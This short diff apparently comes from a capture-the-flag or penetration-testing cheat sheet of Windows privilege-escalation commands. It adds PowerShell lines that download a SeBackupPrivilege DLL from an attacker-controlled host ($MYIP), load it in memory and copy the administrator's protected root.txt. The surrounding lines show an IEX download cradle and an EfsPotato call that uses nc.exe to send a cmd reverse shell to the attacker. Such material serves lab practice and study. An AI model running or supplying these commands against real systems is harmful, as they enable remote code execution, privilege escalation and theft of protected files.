@@ -1325,6 +1325,10 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.
 
 +---------- SeBackupPrivilege ----------+
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
+$a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:8888/windows/SeBackupPrivilegeUtils.dll'))
+$a.GetExportedTypes() | ForEach-Object { $_.FullName }
+[bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
+[bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile("C:\users\administrator\desktop\root.txt", "$((Get-Location).Path)\root.txt", [ref]$([bool]::True), $true); type root.txt
 
 +---------- SeImpersonatePrivilege ----------+
 C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
